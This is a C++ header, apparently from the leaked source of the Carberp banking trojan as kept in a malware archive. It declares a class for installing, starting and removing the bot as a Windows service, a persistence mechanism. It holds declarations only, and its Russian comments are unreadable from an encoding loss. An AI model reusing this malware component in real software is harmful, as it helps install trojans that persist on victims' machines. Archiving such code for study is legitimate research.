/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */

//---------------------------------------------------------------------------
//  ������ ������������ ������ ���� ��� �������
//
//
//  ������:        1.0
//  �������������: ������� 2012
//---------------------------------------------------------------------------

#ifndef BotServiceH
#define BotServiceH
//---------------------------------------------------------------------------



#include "Windows.h"
#include "GetApi.h"
#include "strings.h"

class TService: public TBotObject
{
private:
	SC_HANDLE FManager;
	SC_HANDLE FService;
public:
	string Name;        // ��� �������
	string DisplayName; // ������������ ��� �������
	DWORD  OpenFlags;   // ����� �������� �������
	TService();
	~TService();

	bool Install(const char* ExeName); // ������� ����������� ������ � �������
	bool Uninstall(); // ������� ������������� ������
	bool Open();   // ������� ��������� ������ � ������ Name
    void Close();  // ������� ��������� ������

	bool Start();  // ������� ��������� ������
	bool Stop(DWORD Timeout = 2000);   // ������� ������������� ������

	SC_HANDLE inline Manager() { return FManager; }
	SC_HANDLE inline Service() { return FService; }
};



#define BOT_SERVICE_TYPE SERVICE_WIN32_OWN_PROCESS





//---------------------------------------------------------------------------
#endif
